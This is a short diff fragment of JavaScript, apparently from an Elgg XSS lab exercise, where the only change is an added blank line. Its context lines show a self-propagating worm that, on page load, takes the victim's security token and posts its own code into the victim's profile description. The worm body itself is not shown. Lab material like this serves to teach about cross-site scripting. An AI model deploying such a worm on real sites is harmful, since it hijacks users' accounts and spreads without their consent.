@@ -18,6 +18,7 @@ window.onload = function () {
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
     var description = "&description="+wormCode+"&accesslevel[description]=1";
+
     var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
     var editContent =  guid + ts + token + description;
 
